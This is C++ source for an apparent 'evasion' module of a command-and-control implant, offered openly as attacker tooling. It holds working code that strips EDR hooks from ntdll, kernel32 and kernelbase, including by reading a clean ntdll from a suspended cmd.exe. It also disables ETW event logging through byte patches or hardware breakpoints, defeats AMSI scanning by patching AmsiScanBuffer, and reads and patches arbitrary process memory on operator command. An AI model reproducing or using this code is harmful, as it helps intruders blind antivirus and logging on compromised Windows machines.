/* 
 credits: reenz0h (twitter: @SEKTOR7net)
*/
#include "Evasion.hpp"

#include <cstring>
#include <codecvt>

#ifdef _WIN32
#include <windows.h>
#include <tlhelp32.h>
#include "structs.hpp"
#endif

#include "Common.hpp"


using namespace std;

constexpr std::string_view moduleName = "evasion";
constexpr unsigned long long moduleHash = djb2(moduleName);


#ifdef _WIN32

__declspec(dllexport) Evasion* A_EvasionConstructor() 
{
    return new Evasion();
}

std::string hookChecker(const HMODULE hHookedDll, const LPVOID pMapping);

static int UnhookDll(const HMODULE hHookedDll, const LPVOID pMapping);

int disableETW(void);

#else

__attribute__((visibility("default"))) Evasion* EvasionConstructor() 
{
    return new Evasion();
}

#endif


Evasion::Evasion()
#ifdef BUILD_TEAMSERVER
	: ModuleCmd(std::string(moduleName), moduleHash)
#else
	: ModuleCmd("", moduleHash)
#endif
{
}

Evasion::~Evasion()
{
}

std::string Evasion::getInfo()
{
	std::string info;
#ifdef BUILD_TEAMSERVER
	info += "evasion:\n";
	info += "exemple:\n";
	info += "- evasion CheckHooks (ntdll, kernelbase, kernel32)\n";
	info += "- evasion DisableETW\n";
	info += "- evasion Unhook (ntdll, kernelbase, kernel32)\n";
	info += "- evasion UnhookPerunsFart (ntdll)\n";
	info += "- evasion AmsiBypass\n";
	info += "- evasion Introspection moduleName\n";
	info += "- evasion ReadMemory 0x123456 20\n";
	info += "- evasion PatchMemory 0x123456 \\x90\\x90\\x90\\x90\n";
#endif
	return info;
}


#define CheckHooks "1"
#define DisableETW "2"
#define Unhook "3"
#define UnhookPerunsFart "4"
#define AmsiBypass "5"
#define Introspection "6"
#define ReadMemory "7"
#define PatchMemory "8"
#define RemotePatch "9"


int Evasion::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
	if (splitedCmd.size() >= 2)
	{
		std::string cmd = splitedCmd[1];
		c2Message.set_instruction(splitedCmd[0]);
		
		if(cmd=="CheckHooks")
		{
			c2Message.set_cmd(CheckHooks);
		}
		else if(cmd=="DisableETW")
		{
			c2Message.set_cmd(DisableETW);
		}
		else if(cmd=="Unhook")
		{		
			c2Message.set_cmd(Unhook);
		}
		else if(cmd=="UnhookPerunsFart")
		{		
			c2Message.set_cmd(UnhookPerunsFart);
		}
		else if(cmd=="AmsiBypass")
		{
			c2Message.set_cmd(AmsiBypass);
		}
		else if(cmd=="Introspection")
		{
			c2Message.set_cmd(Introspection);
			if (splitedCmd.size() >= 3)
			{
				c2Message.set_data(splitedCmd[2]);
			}
		}
		else if(cmd=="ReadMemory")
		{
			c2Message.set_cmd(ReadMemory);
			if (splitedCmd.size() >= 4)
			{
				c2Message.set_data(splitedCmd[2]);
				c2Message.set_args(splitedCmd[3]);
			}
			else
			{
				c2Message.set_returnvalue(getInfo());
				return -1;
			}
		}
		else if(cmd=="PatchMemory")
		{
			c2Message.set_cmd(PatchMemory);
			if (splitedCmd.size() >= 4)
			{
				c2Message.set_data(splitedCmd[2]);
				c2Message.set_args(splitedCmd[3]);
			}
			else
			{
				c2Message.set_returnvalue(getInfo());
				return -1;
			}
		}
		else if(cmd=="RemotePatch")
		{
			c2Message.set_cmd(RemotePatch);
		}
	}
	else
	{
		c2Message.set_returnvalue(getInfo());
		return -1;
	}
#endif
	return 0;
}


int Evasion::process(C2Message &c2Message, C2Message &c2RetMessage)
{
	std::string result;
	const std::string cmd = c2Message.cmd();

#ifdef _WIN32

	if(cmd==CheckHooks)
	{
		checkHooks(result);
	}
	else if(cmd==DisableETW)
	{
		disableETW();
		result+="success";
	}
	else if(cmd==Unhook)
	{		
		unhookFreshCopy(result);
	}
	else if(cmd==UnhookPerunsFart)
	{		
		unhookPerunsFart(result);
	}
	else if(cmd==AmsiBypass)
	{		
		amsiBypass(result);
	}
	else if(cmd==Introspection)
	{		
		std::string data = c2Message.data();
		introspection(result, data);
	}
	else if(cmd==ReadMemory)
	{		
		std::string data = c2Message.data();
		std::string args = c2Message.args();

		int size=0;
		try 
		{
			size = atoi(args.c_str());
		}
		catch (const std::invalid_argument& ia) 
		{
			return 0;
		}
		
		readMemory(result, data, size);
	}
	else if(cmd==PatchMemory)
	{		
		std::string data = c2Message.data();
		std::string args = c2Message.args();
		patchMemory(result, data, args);
	}
	else if(cmd==RemotePatch)
	{
		remotePatch(result);
	}
		
#endif

	c2RetMessage.set_instruction(c2RetMessage.instruction());
	c2RetMessage.set_cmd("");
	c2RetMessage.set_returnvalue(result);

	return 0;
}

#ifdef _WIN32


int Evasion::checkHooks(std::string& result)
{
	std::string dllBasePath="c:\\windows\\system32\\";
	std::vector<std::string> dllNames;
	dllNames.push_back("kernel32.dll");
	dllNames.push_back("ntdll.dll");
	dllNames.push_back("kernelbase.dll");

	for(int i=0; i<dllNames.size(); i++)
	{
		std::string dllPath=dllBasePath;
		dllPath+=dllNames[i];

		HANDLE hFile = CreateFile((LPCSTR) dllPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		if ( hFile == INVALID_HANDLE_VALUE ) 
		{
			return -1;
		}

		HANDLE hFileMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
		if (! hFileMapping) 
		{
			CloseHandle(hFile);
			return -1;
		}
		
		LPVOID pMapping = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
		if (!pMapping) 
		{
			CloseHandle(hFileMapping);
			CloseHandle(hFile);
			return -1;
		}
			
		result+="\n-> ";
		result+=dllNames[i];
		result+=":\n";
		result+=hookChecker(GetModuleHandle((LPCSTR) dllNames[i].c_str()), pMapping);

		UnmapViewOfFile(pMapping);
		CloseHandle(hFileMapping);
		CloseHandle(hFile);
	}
	
	return 0;
}


int Evasion::unhookFreshCopy(std::string& result)
{
	std::string dllBasePath="c:\\windows\\system32\\";
	std::vector<std::string> dllNames;
	dllNames.push_back("kernel32.dll");
	dllNames.push_back("ntdll.dll");
	dllNames.push_back("kernelbase.dll");

	for(int i=0; i<dllNames.size(); i++)
	{
		std::string dllPath=dllBasePath;
		dllPath+=dllNames[i];

		HANDLE hFile = CreateFile((LPCSTR) dllPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		if ( hFile == INVALID_HANDLE_VALUE ) 
		{
			return -1;
		}

		HANDLE hFileMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
		if (! hFileMapping) 
		{
			CloseHandle(hFile);
			return -1;
		}
		
		LPVOID pMapping = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
		if (!pMapping) 
		{
			CloseHandle(hFileMapping);
			CloseHandle(hFile);
			return -1;
		}

		// remove hooks
		result+="\n-> ";
		result+=dllNames[i];
		result+=":\n";
		int ret = UnhookDll(GetModuleHandle((LPCSTR) dllNames[i].c_str()), pMapping);
		if(ret!=0)
			result+="Failed";
		else
			result+="Success";

		UnmapViewOfFile(pMapping);
		CloseHandle(hFileMapping);
		CloseHandle(hFile);
	}

	return 0;
}


int findFirstSyscall(char * pMem, DWORD size)
{
	// gets the first byte of first syscall
	DWORD i = 0;
	DWORD offset = 0;
	BYTE pattern1[] = "\x0f\x05\xc3";  // syscall ; ret
	BYTE pattern2[] = "\xcc\xcc\xcc";  // int3 * 3
	
	// find first occurance of syscall+ret instructions
	for (i = 0; i < size - 3; i++) 
	{
		if (!memcmp(pMem + i, pattern1, 3)) 
		{
			offset = i;
			break;
		}
	}		
	
	// now find the beginning of the syscall
	for (i = 3; i < 50 ; i++) 
	{
		if (!memcmp(pMem + offset - i, pattern2, 3)) 
		{
			offset = offset - i + 3;
			// printf("First syscall found at 0x%p\n", pMem + offset);
			break;
		}		
	}

	return offset;
}


int findLastSysCall(char * pMem, DWORD size) 
{
	// returns the last byte of the last syscall
	DWORD i;
	DWORD offset = 0;
	BYTE pattern[] = "\x0f\x05\xc3\xcd\x2e\xc3\xcc\xcc\xcc";  // syscall ; ret ; int 2e ; ret ; int3 * 3
	
	// backwards lookup
	for (i = size - 9; i > 0; i--) 
	{
		if (!memcmp(pMem + i, pattern, 9)) 
		{
			offset = i + 6;
			// printf("Last syscall byte found at 0x%p\n", pMem + offset);
			break;
		}
	}		
	
	return offset;
}


static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pCache) 
{
    // UnhookNtdll() finds fresh "syscall table" of ntdll.dll from suspended process and copies over onto hooked one
	DWORD oldprotect = 0;
	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pCache;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pCache + pImgDOSHead->e_lfanew);

	// find .text section
	for (int i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) 
	{
		PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char *)pImgSectionHead->Name, ".text")) 
		{
			// prepare ntdll.dll memory region for write permissions.
			VirtualProtect((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
							pImgSectionHead->Misc.VirtualSize,
							PAGE_EXECUTE_READWRITE,
							&oldprotect);
			if (!oldprotect) 
			{
				// RWX failed!
				return -1;
			}

			// copy clean "syscall table" into ntdll memory
			DWORD SC_start = findFirstSyscall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
			DWORD SC_end = findLastSysCall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
			
			if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) 
			{
				DWORD SC_size = SC_end - SC_start;
				printf("dst (in ntdll): %p\n", ((DWORD_PTR) hNtdll + SC_start));
				printf("src (in cache): %p\n", ((DWORD_PTR) pCache + SC_start));
				printf("size: %i\n", SC_size);
				memcpy( (LPVOID)((DWORD_PTR) hNtdll + SC_start),
						(LPVOID)((DWORD_PTR) pCache + + SC_start),
						SC_size);
			}

			// restore original protection settings of ntdll
			VirtualProtect((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
							pImgSectionHead->Misc.VirtualSize,
							oldprotect,
							&oldprotect);
			if (!oldprotect) 
			{
				// it failed	
				return -1;
			}
			return 0;
		}
	}
	
	// failed? .text not found!
	return -1;
}


int Evasion::unhookPerunsFart(std::string& result)
{
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	BOOL success = CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, "C:\\Windows\\System32\\", &si, &pi);
	if (success == FALSE) 
	{
		result+="Failed to CreateProcess.";
		return -1;
	}	

	// get the size of ntdll module in memory
	char * pNtdllAddr = (char *) GetModuleHandle("ntdll.dll");
	IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *) pNtdllAddr;
	IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *) (pNtdllAddr + pDosHdr->e_lfanew);
	IMAGE_OPTIONAL_HEADER * pOptionalHdr = &pNTHdr->OptionalHeader;
	
	SIZE_T ntdll_size = pOptionalHdr->SizeOfImage;
	
	// allocate local buffer to hold temporary copy of clean ntdll from remote process
	LPVOID pCache = VirtualAlloc(NULL, ntdll_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	
	SIZE_T bytesRead = 0;
	if (!ReadProcessMemory(pi.hProcess, pNtdllAddr, pCache, ntdll_size, &bytesRead))
	{
		result+="Failed to CreateProcess.";
		return -1;
	}	
		
	TerminateProcess(pi.hProcess, 0);
	
	// remove hooks
	unsigned char sNtdll[] = "ntdll.dll";
	int ret = UnhookNtdll(GetModuleHandle((LPCSTR) sNtdll), pCache);
	if(ret!=0)
		result+="Failed";
	else
		result+="Success";

	return 0;
}


int SetHWBP(HANDLE thrd, DWORD64 addr, BOOL setBP) 
{
	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_ALL;

	GetThreadContext(thrd, &ctx);
	
	if (setBP == TRUE) {
		ctx.Dr0 = addr;
		ctx.Dr7 |= (1 << 0);  		// Local DR0 breakpoint
		ctx.Dr7 &= ~(1 << 16);		// break on execution
		ctx.Dr7 &= ~(1 << 17);

	}
	else if (setBP == FALSE) {
		ctx.Dr0 = NULL;
		ctx.Dr7 &= ~(1 << 0);
	}

	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;	
	SetThreadContext(thrd, &ctx);

	return 0;
}


LONG WINAPI handlerETW(EXCEPTION_POINTERS * ExceptionInfo) 
{
	if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) 
	{
		BYTE* baseAddress = (BYTE*)GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");

		if (ExceptionInfo->ContextRecord->Rip == (DWORD64) baseAddress) 
		{
			printf("[!] Exception (%#llx)! Params:\n", ExceptionInfo->ExceptionRecord->ExceptionAddress);
			printf("(1): %#d | ", ExceptionInfo->ContextRecord->Rcx);
			printf("(2): %#llx | ", ExceptionInfo->ContextRecord->Rdx);
			printf("(3): %#llx | ", ExceptionInfo->ContextRecord->R8);
			printf("(4): %#llx | ", ExceptionInfo->ContextRecord->R9);
			printf("RSP = %#llx\n", ExceptionInfo->ContextRecord->Rsp);
			
			printf("EtwEventWrite called!\n");
			
			// continue the execution
			ExceptionInfo->ContextRecord->EFlags |= (1 << 16);			// set RF (Resume Flag) to continue execution
			//ExceptionInfo->ContextRecord->Rip++;						// or skip the breakpoint via instruction pointer
		}		
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	return EXCEPTION_CONTINUE_SEARCH;
}


int disableETW(void) 
{
	bool isPatchEtw = false;
	bool isHwBp = true;
	if(isPatchEtw)
	{
		unsigned char sEtwEventWrite[] = "EtwEventWrite";
		void * pEventWrite = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR) sEtwEventWrite);
		
		DWORD oldprotect = 0;
		// do you crash if the code is executed while not executable?
		VirtualProtect(pEventWrite, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);

	#ifdef _WIN64
		memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4); 		// xor rax, rax; ret
	#else
		memcpy(pEventWrite, "\x33\xc0\xc2\x14\x00", 5);		// xor eax, eax; ret 14
	#endif

		VirtualProtect(pEventWrite, 4096, oldprotect, &oldprotect);
		FlushInstructionCache(GetCurrentProcess(), pEventWrite, 4096);
	}
	// TODO
	else if(isHwBp)
	{
		AddVectoredExceptionHandler(0, &handlerETW);

		BYTE* baseAddress = (BYTE*)GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
		DWORD64 dword64Address = reinterpret_cast<uintptr_t>(baseAddress);

		SetHWBP(GetCurrentThread(), (DWORD64) dword64Address, TRUE);
	}

	return 0;
}


std::string hookChecker(const HMODULE hHookedDll, const LPVOID pMapping) 
{
	// Get information from about function from the mapping of the new dll
	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pMapping;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pMapping + pImgDOSHead->e_lfanew);

	std::string hookedFunctions;
	if (pImgNTHead->Signature != IMAGE_NT_SIGNATURE) 
	{
		return hookedFunctions;
	}

	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pMapping + pImgNTHead->OptionalHeader.DataDirectory[0].VirtualAddress);	

	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pMapping + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pMapping + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pMapping + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) 
	{
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pMapping + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pMapping + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		PVOID pFunctionAddressHookedDll = (PBYTE)hHookedDll + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
		
		if (*((PBYTE)pFunctionAddress) == *((PBYTE)pFunctionAddressHookedDll)
			&& *((PBYTE)pFunctionAddress + 1) == *((PBYTE)pFunctionAddressHookedDll + 1)
			&& *((PBYTE)pFunctionAddress + 2) == *((PBYTE)pFunctionAddressHookedDll + 2)
			&& *((PBYTE)pFunctionAddress + 3) == *((PBYTE)pFunctionAddressHookedDll + 3)
			&& *((PBYTE)pFunctionAddress + 6) == *((PBYTE)pFunctionAddressHookedDll + 6)
			&& *((PBYTE)pFunctionAddress + 7) == *((PBYTE)pFunctionAddressHookedDll + 7)) 
		{				
			// printf("[+] function %s clean\n", pczFunctionName);
		}
		else
		{
			std::string msg="[-] function ";
			msg+=pczFunctionName;
			msg+=" hooked\n";
			hookedFunctions+=msg;
		}
	}

	return hookedFunctions;
}


static int UnhookDll(const HMODULE hHookedDll, const LPVOID pMapping)
{
	// UnhookDll() finds .text segment of fresh loaded copy of dll and copies over the hooked one
	DWORD oldprotect = 0;
	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pMapping;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pMapping + pImgDOSHead->e_lfanew);

	// find .text section
	for (int i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) 
	{
		PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + 
												((DWORD_PTR) IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char *) pImgSectionHead->Name, ".text")) 
		{
			// prepare dll memory region for write permissions.
			VirtualProtect((LPVOID)((DWORD_PTR) hHookedDll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
							pImgSectionHead->Misc.VirtualSize,
							PAGE_EXECUTE_READWRITE,
							&oldprotect);
			if (!oldprotect) 
			{
				return -1;
			}

			// copy fresh .text section into dll memory
			memcpy( (LPVOID)((DWORD_PTR) hHookedDll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
					(LPVOID)((DWORD_PTR) pMapping + (DWORD_PTR) pImgSectionHead->VirtualAddress),
					pImgSectionHead->Misc.VirtualSize);

			// restore original protection settings of dll memory
			VirtualProtect((LPVOID)((DWORD_PTR)hHookedDll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
							pImgSectionHead->Misc.VirtualSize,
							oldprotect,
							&oldprotect);
			
			if (!oldprotect) 
			{
				return -1;
			}
			return 0;
		}
	}

	return -1;
}


int findAndPatchStringInMemory(const char* target, const char* patch, void* exclusion = nullptr) 
{
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);

    MEMORY_BASIC_INFORMATION mbi;
    char* address = 0;
    size_t targetLength = std::strlen(target);
	size_t patchLength = std::strlen(patch);

	int nbPatchApplied = 0;
    while (address < sysInfo.lpMaximumApplicationAddress) 
	{
        if (VirtualQuery(address, &mbi, sizeof(mbi)) == sizeof(mbi)) 
		{
			// only check for read-write memory
            if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_READWRITE)) 
			{
                char* buffer = new char[mbi.RegionSize];
                SIZE_T bytesRead;
                if (ReadProcessMemory(GetCurrentProcess(), address, buffer, mbi.RegionSize, &bytesRead)) 
				{
                    for (size_t i = 0; i <= bytesRead - targetLength; ++i) 
					{
                        if (std::memcmp(buffer + i, target, targetLength) == 0 && (exclusion == nullptr || address + i != exclusion)) 
						{
							memcpy( (void*)(address + i), (void*)(patch), patchLength);
							nbPatchApplied++;
                        }
                    }
                }
                delete[] buffer;
            }
        }
        address += mbi.RegionSize;
    }
    return nbPatchApplied;
}


void* findStringInMemory(const char* target, void* startAddress, int lenght) 
{
	char* address = (char*)startAddress;
	size_t targetLength = std::strlen(target);

	for (size_t i = 0; i <= lenght - targetLength; ++i) 
	{
		if (std::memcmp(address + i, target, targetLength) == 0) 
		{
			return (void*)(address+i);
		}
	}
	return nullptr;
}


LONG WINAPI handlerAmsi(EXCEPTION_POINTERS * ExceptionInfo) 
{
	if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) 
	{
		BYTE* baseAddress = (BYTE*)GetProcAddress(GetModuleHandle("amsi.dll"), "AmsiScanBuffer");

		if (ExceptionInfo->ContextRecord->Rip == (DWORD64) baseAddress) 
		{
			// printf("[!] Exception (%#llx)! Params:\n", ExceptionInfo->ExceptionRecord->ExceptionAddress);
			// printf("(1): %#d | ", ExceptionInfo->ContextRecord->Rcx);
			// printf("(2): %#llx | ", ExceptionInfo->ContextRecord->Rdx);
			// printf("(3): %#llx | ", ExceptionInfo->ContextRecord->R8);
			// printf("(4): %#llx | ", ExceptionInfo->ContextRecord->R9);
			// printf("RSP = %#llx\n", ExceptionInfo->ContextRecord->Rsp);
			
			// printf("AmsiScanBuffer called!\n");
			
			// continue the execution
			ExceptionInfo->ContextRecord->EFlags |= (1 << 16);			// set RF (Resume Flag) to continue execution
			//ExceptionInfo->ContextRecord->Rip++;						// or skip the breakpoint via instruction pointer
		}		
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	return EXCEPTION_CONTINUE_SEARCH;
}


int Evasion::amsiBypass(std::string& result)
{
	bool isPatchContext = false;
	bool isHwBp = false;
	bool codePatch = true;
	// only work for the curent thread which is not ideal
	if(isPatchContext)
	{
		string target = "AMSI\0\0\0\0";
		string patch = "ASM";
		int nbPatchApplied = findAndPatchStringInMemory(target.c_str(), patch.c_str(), (void*)(&target)); 

		if(nbPatchApplied)
			result+="Success";
		else
			result+="Failed";
	}
	// only work for the curent thread which is not ideal
	else if(isHwBp)
	{
		AddVectoredExceptionHandler(1, &handlerAmsi);

		BYTE* baseAddress = (BYTE*)GetProcAddress(GetModuleHandle("amsi.dll"), "AmsiScanBuffer");
		DWORD64 dword64Address = reinterpret_cast<uintptr_t>(baseAddress);

		SetHWBP(GetCurrentThread(), (DWORD64) dword64Address, TRUE);
	}
	else if(codePatch)
	{
		std::string target = "AMSI";
		BYTE* baseAddress = (BYTE*)GetProcAddress(GetModuleHandle("amsi.dll"), "AmsiScanBuffer");
		int lenght = 0x100;

		void* address = findStringInMemory(target.c_str(), (void*)baseAddress, lenght);

		if(address)
		{
			DWORD oldprotect = 0;
			VirtualProtect(address, 1024, PAGE_READWRITE, &oldprotect);

			std::string patch = "ASMI";
			memcpy( (void*)(address), (void*)(patch.c_str()), patch.size());

			VirtualProtect(address, 1024, oldprotect, &oldprotect);
			result+="Success";
		}
		else
		{
			result+="Failed";
		}
	}

	return 1;
}


std::string wstringToString(const std::wstring& wstr) 
{
    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
    return converter.to_bytes(wstr);
}


std::string EnumerateLoadedModules() 
{
    // Get the PEB address
#ifdef _WIN64
    PPEB pPEB = (PPEB)__readgsqword(0x60);
#else
    PPEB pPEB = (PPEB)__readfsdword(0x30);
#endif

    // Get the PEB_LDR_DATA structure
    PPEB_LDR_DATA pLdr = pPEB->LoaderData;

    // Traverse the InLoadOrderModuleList
    PLIST_ENTRY pListHead = &pLdr->InLoadOrderModuleList;
    PLIST_ENTRY pListEntry = pListHead->Flink;

	std::string loadedModules;
    while (pListEntry != pListHead) 
	{
        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
		loadedModules += wstringToString(pEntry->FullDllName.Buffer);
		loadedModules += "\n";
        pListEntry = pListEntry->Flink;
    }

	return loadedModules;
}


std::string EnumerateExports(const char* moduleName) 
{
    // Get the base address of the module
    BYTE* baseAddress = (BYTE*)GetModuleHandleA(moduleName);
    if (!baseAddress) 
	{
        return "Failed to get module handle";
    }

    // Get the DOS header
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddress;
    // Get the NT headers
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddress + dosHeader->e_lfanew);

    // Get the export directory
    IMAGE_DATA_DIRECTORY exportDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)(baseAddress + exportDirectory.VirtualAddress);

    // Get the addresses of the functions, names, and ordinals
    DWORD* functions = (DWORD*)(baseAddress + exportDir->AddressOfFunctions);
    DWORD* names = (DWORD*)(baseAddress + exportDir->AddressOfNames);
    WORD* ordinals = (WORD*)(baseAddress + exportDir->AddressOfNameOrdinals);

    // Enumerate the exported functions
	std::string exportedFunctions;
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) 
	{
        const char* functionName = (const char*)(baseAddress + names[i]);
        DWORD64 functionAddress = (DWORD64)(baseAddress + functions[ordinals[i]]);

		std::stringstream ss;
        ss << "0x" << std::hex << functionAddress;
        std::string hexAddress = ss.str();

		exportedFunctions += functionName;
		exportedFunctions += " at address: ";
		exportedFunctions += hexAddress;
		exportedFunctions += "\n";
    }

	return exportedFunctions;
}


int Evasion::introspection(std::string& result, std::string& moduleName)
{
	if(moduleName.size()>0)
		result = EnumerateExports(moduleName.c_str());
	else
		result = EnumerateLoadedModules();
	return 0;
}


void* hexStringToPointer(const std::string& hexString) 
{
    // Convert the hex string to an unsigned long long
    unsigned long long address = std::stoull(hexString, nullptr, 16);
    // Cast the address to a void* pointer
    return reinterpret_cast<void*>(address);
}


std::string hexStringToBytes(const std::string& hexString) 
{
    std::string bytes;
    for (size_t i = 0; i < hexString.length(); i += 4) 
	{
        // Extract the hex byte (skip the "\x" prefix)
        std::string hexByte = hexString.substr(i + 2, 2);
        // Convert the hex byte to an integer
        unsigned int byte;
        std::stringstream ss;
        ss << std::hex << hexByte;
        ss >> byte;
        // Append the byte to the result string
        bytes.push_back(static_cast<char>(byte));
    }
    return bytes;
}

std::string stringToHexFormat(const std::string& input) 
{
    std::ostringstream oss;
    for (unsigned char c : input) 
	{
        oss << "\\x" << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(c);
    }
    return oss.str();
}


// hexAddress: 0x12345678
// patch: \x90\x90\x90\x90
int Evasion::patchMemory(std::string& result, const std::string& hexAddress, const std::string& patch)
{
	void* address = hexStringToPointer(hexAddress);
	std::string bytes = hexStringToBytes(patch);

	MEMORY_BASIC_INFORMATION mbi;
	size_t patchLength = std::strlen(bytes.c_str());

	if (VirtualQuery(address, &mbi, sizeof(mbi)) == sizeof(mbi)) 
		{
			// check if write memory
            if (mbi.State == MEM_COMMIT && ((mbi.Protect & PAGE_READWRITE) || (mbi.Protect & PAGE_EXECUTE_READWRITE))) 
			{
				memcpy( (void*)(address), (void*)(bytes.c_str()), patchLength);
            }
			else
			{
				DWORD oldprotect = 0;
				VirtualProtect(address, 1024, PAGE_READWRITE, &oldprotect);

				memcpy( (void*)(address), (void*)(bytes.c_str()), patchLength);

				VirtualProtect(address, 1024, oldprotect, &oldprotect);
            }
        }

	return 0;
}


int Evasion::readMemory(std::string& result, const std::string& hexAddress, const int size)
{
	void* address = hexStringToPointer(hexAddress);
	MEMORY_BASIC_INFORMATION mbi;
	size_t bytesRead = 0;

	if (VirtualQuery(address, &mbi, sizeof(mbi)) == sizeof(mbi)) 
		{
			// check if read memory
			if (mbi.State == MEM_COMMIT && ((mbi.Protect & PAGE_READONLY) || (mbi.Protect & PAGE_READWRITE) || (mbi.Protect & PAGE_EXECUTE_READ) || (mbi.Protect & PAGE_EXECUTE_READWRITE))) 
			{
				char* buffer = new char[size];
				if (ReadProcessMemory(GetCurrentProcess(), address, buffer, size, &bytesRead)) 
				{
					result = stringToHexFormat(buffer);
				}
				delete[] buffer;
			}
		}

	return 0;
}


//
// Remote patching
//
int FindTarget(const char *procname) 
{
	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;
			
	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
			
	pe32.dwSize = sizeof(PROCESSENTRY32); 
			
	if (!Process32First(hProcSnap, &pe32)) 
	{
			CloseHandle(hProcSnap);
			return 0;
	}
			
	while (Process32Next(hProcSnap, &pe32)) 	
	{
		if (lstrcmpiA(procname, pe32.szExeFile) == 0) 
		{
				pid = pe32.th32ProcessID;
				break;
		}
	}
			
	CloseHandle(hProcSnap);
			
	return pid;
}


int FindThreadID(int pid)
{
    int tid = 0;
    THREADENTRY32 thEntry;

    thEntry.dwSize = sizeof(thEntry);
    HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
                
	while (Thread32Next(Snap, &thEntry)) 
	{
		if (thEntry.th32OwnerProcessID == pid)  
		{
			tid = thEntry.th32ThreadID;
			break;
		}
	}
	CloseHandle(Snap);
	
	return tid;
}


#define RETVAL_TAG 0xAABBCCDD
typedef NTSTATUS (NTAPI * RtlRemoteCall_t)(HANDLE	Process, HANDLE	Thread,	PVOID	CallSite, ULONG	ArgumentCount, PULONG	Arguments, BOOLEAN	PassContext, BOOLEAN	AlreadySuspended);
typedef NTSTATUS (NTAPI * NtContinue_t)(PCONTEXT	ThreadContext, BOOLEAN		RaiseAlert);
